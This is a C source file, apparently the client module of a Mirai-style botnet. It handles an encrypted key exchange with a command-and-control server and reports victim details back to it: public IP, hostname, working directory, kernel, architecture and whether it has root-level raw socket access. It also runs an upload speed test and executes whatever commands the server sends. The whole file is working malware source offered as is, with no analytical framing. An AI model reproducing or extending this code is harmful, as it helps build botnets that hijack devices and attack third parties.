#include <arpa/inet.h>
#include <elf.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <netinet/in.h>
#include <poll.h>
#include <pty.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/sysinfo.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "bot/client/client.h"
#include "bot/client/commands.h"
#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/speedtest/latency_test.h"
#include "bot/speedtest/upload_test.h"
#include "bot/utils/bytebuf.h"
#include "bot/utils/fasthash.h"
#include "bot/utils/network.h"
#include "bot/utils/stun.h"

#include "crypto/chacha20.h"
#include "crypto/teax.h"

static inline bool key_handover(pclient_t client);
static inline bool verify_handover(pclient_t client);
static inline bool identity(pclient_t client);
static inline bool connected(pclient_t client);
static inline void write_identity(pclient_t client);
static inline void _retrieve_architecture(Elf32_Ehdr *hdr);

#ifdef SPEEDTEST
int speedtest_pid = -1;
void client_handle_speedtest() {
  if (speedtest_pid != -1 && kill(speedtest_pid, 0) == 0) {
    kill(speedtest_pid, 9);
    speedtest_pid = -1;
  }

  speedtest_pid = fork();
  if (speedtest_pid < 0 || speedtest_pid > 0) {
    return;
  }

  server_list_t list = {0};
  int srv_index = 0;
  int latency = 0;

  if (speedtest_retrieve_list(&list) != 0) {
    LOG_INFO("Error occurred while retrieving speedtest list");
    speedtest_free_list(&list);
    exit(0);
  }

  if (speedtest_lowest_latency(&list, &srv_index, &latency) != 0) {
    LOG_INFO("Error occurred while getting lowest latency");
    speedtest_free_list(&list);
    exit(0);
  }

  const uint64_t speedKbps = speedtest_upload_test(&list.urls[srv_index], 10);
  if (speedKbps <= 0) {
    LOG_WARN("Testing upload speed failed");
    speedtest_free_list(&list);
    exit(0);
  }

  // write piped msg
  pbytebuf_t buf = bytebuf_new_write();
  bytebuf_write_string(buf, list.urls[srv_index].host);
  bytebuf_write_uint64(buf, speedKbps);
  pipe_write(REPORT_SPEEDTEST, buf);
  bytebuf_free(buf, NULL);

  speedtest_free_list(&list);
  exit(0);
}
#endif

bool client_handle_states(pclient_t client) {
  switch (client->state) {
    case CLIENT_STATE_HANDOVER:
      return key_handover(client);
    case CLIENT_STATE_VERIFY:
      return verify_handover(client);
    case CLIENT_STATE_IDENTIFY:
      return identity(client);
    case CLIENT_STATE_CONNECTED:
      return connected(client);
    default: {
      LOG_INFO("Invalid state!");
      return false;
    }
  }
}

static inline bool key_handover(pclient_t client) {
  if (!client_read(client)) {
    return false;
  }

  if (client->hdr.command != REQ_KEY_EXCHANGE) {
    LOG_ERROR("Key handover failed (invalid command); received=%d, expected=%d",
              client->hdr.command, REQ_KEY_EXCHANGE);
    return false;
  }

  // read data
  pbytebuf_t buf = bytebuf_new_read(client->data, client->hdr.len);

  size_t key_len = 0, nonce_len = 0;
  teax_ctx_t ctx;

  uint8_t *key = bytebuf_read_bytes(buf, &key_len);
  uint32_t key_hash = bytebuf_read_uint32(buf);

  uint8_t *nonce = bytebuf_read_bytes(buf, &nonce_len);
  uint32_t nonce_hash = bytebuf_read_uint32(buf);

  if (key_len != CHACHA20_KEY_SIZE) {
    LOG_ERROR("Key handover failed (invalid key len); received=%d, expected=%d", key_len,
              CHACHA20_KEY_SIZE);
    bytebuf_free(buf, client->data);
    return false;
  }

  if (nonce_len != CHACHA20_NONCE_SIZE) {
    LOG_ERROR("Key handover failed (invalid nonce len); received=%d, expected=%d", nonce_len,
              CHACHA20_NONCE_SIZE);
    bytebuf_free(buf, client->data);
    return false;
  }

  // init state, process key
  teax_init(&ctx, (uint8_t *)TEAX_KEY, 16);
  teax_process(&ctx, key, key, CHACHA20_KEY_SIZE);

  // reinit state, process nonce
  teax_init(&ctx, (uint8_t *)TEAX_KEY, 16);
  teax_process(&ctx, nonce, nonce, CHACHA20_NONCE_SIZE);

  if (hash32(key, CHACHA20_KEY_SIZE, 0xDEADBEEF) != key_hash) {
    LOG_FATAL("Receiving key failed, hash does not match!");
    bytebuf_free(buf, client->data);
    return false;
  }

  if (hash32(nonce, CHACHA20_NONCE_SIZE, 0xDEADBEEF) != nonce_hash) {
    LOG_FATAL("Receiving nonce failed, hash does not match!");
    bytebuf_free(buf, client->data);
    return false;
  }

  // copy encrypted key and nonce
  memcpy(client->key, key, CHACHA20_KEY_SIZE);
  memcpy(client->nonce, nonce, CHACHA20_NONCE_SIZE);

  // clean up
  bytebuf_free(buf, client->data);
  client->data = NULL;

  // switch states
  LOG_INFO("Received and parsed session encryption key and nonce");

  client->state = CLIENT_STATE_VERIFY;
  client_write(client, REQ_VERIFICATION, NULL);

  return true;
}

static inline bool verify_handover(pclient_t client) {
  if (!client_read(client)) {
    return false;
  }

  if (client->hdr.command != REQ_VERIFICATION) {
    LOG_ERROR("Verification failed (invalid command); received=%d, expected=%d",
              client->hdr.command, REQ_VERIFICATION);
    return false;
  }

  LOG_INFO("Received key verification");

  write_identity(client);
  client->state = CLIENT_STATE_IDENTIFY;

  free(client->data);
  client->data = NULL;

  return true;
}

static inline void write_identity(pclient_t client) {
  struct sockaddr_in addr = {0};
  char hostname[HOST_NAME_MAX + 1] = {0};
  char cwd[PATH_MAX + 1] = {0};

  // hdr info
  Elf32_Ehdr elf = {0};
  struct utsname info = {0};
  bool has_socket_creation = false;

  // retrieve architecture
  _retrieve_architecture(&elf);
  uname(&info);

  // retrieve public stun address
  if (!stun_get_public_ip(&addr)) {
    addr.sin_addr.s_addr = network_local_addr();
    LOG_ERROR("Public address retrieval over STUN failed, falling back to local address.");
  }

  // retrieve hostname
  if (gethostname(hostname, sizeof(hostname)) != 0) {
    LOG_INFO("Retrieving hostname failed");
  }

  // retrieve cwd
  if (getcwd(cwd, sizeof(cwd)) < 0) {
    LOG_INFO("Retrieving cwd failed");
  }

  // retrieve root status
  int fd;
  if ((fd = socket(AF_INET, SOCK_RAW, SOCK_DGRAM)) >= 0) {
    has_socket_creation = true;
    close(fd);
  }

  pbytebuf_t buf = bytebuf_new_write();

  // information that has been there since 1.x
  bytebuf_write_uint32(buf, htonl(addr.sin_addr.s_addr)); // address
  bytebuf_write_string(buf, client->name);                // client name
  bytebuf_write_uint32(buf, 4);                           // version

  bytebuf_write_string(buf, hostname);     // client hostname
  bytebuf_write_string(buf, cwd);          // current work directory lmao
  bytebuf_write_string(buf, info.release); // current kernel release

  bytebuf_write_uint16(buf, elf.e_machine);       // architecture id
  bytebuf_write_uint8(buf, elf.e_ident[EI_DATA]); // device endianess
  bytebuf_write_uint8(buf, has_socket_creation);  // device can create sockets

  client_write(client, REQ_IDENTIFY, buf);
  bytebuf_free(buf, NULL);

  LOG_INFO("Sent identification information");
}

static inline bool identity(pclient_t client) {
  if (!client_read(client)) {
    LOG_ERROR("reading failed!");
    return false;
  }

  if (client->hdr.command != REQ_IDENTIFY) {
    LOG_ERROR("Identity failed (invalid command); received=%d, expected=%d", client->hdr.command,
              REQ_IDENTIFY);
    return false;
  }

  // create byte buffer
  pbytebuf_t buf = bytebuf_new_read(client->data, client->hdr.len);
  client->hash = bytebuf_read_uint32(buf);
  bytebuf_free(buf, client->data);
  client->state = CLIENT_STATE_CONNECTED;

// perform a speedtest
#ifdef SPEEDTEST
  client_handle_speedtest();
#endif

  LOG_INFO("Handshake succeeeded (session_id=0x%04X)", client->hash);

  return true;
}

static inline bool connected(pclient_t client) {
  if (!client_read(client)) return false;
  pbytebuf_t buf = bytebuf_new_read(client->data, client->hdr.len);

  // search for client commands
  for (size_t i = 0; i < sizeof(client_cmd_handlers) / sizeof(client_cmd_handlers[0]); i++) {
    if (client_cmd_handlers[i].id == client->hdr.command) {
      LOG_DEBUG("Retrieved handler for command ['0x%02x']", client->hdr.command);

      client_cmd_handlers[i].func(client, buf);
      break;
    }
  }

  // free it out
  if (buf) {
    LOG_DEBUG("Deallocating byte buffer (%d bytes)", client->hdr.len);

    bytebuf_free(buf, client->data);
    client->data = NULL;
  }

  return true;
}

static inline void _retrieve_architecture(Elf32_Ehdr *hdr) {
  memset(hdr, '\0', sizeof(Elf32_Ehdr));

  int fd = open(table_retrieve(TABLE_KILLER_SELF_EXE, NULL), O_RDONLY);
  if (fd < 0) return;

  read(fd, hdr, sizeof(Elf32_Ehdr));
  close(fd);
}
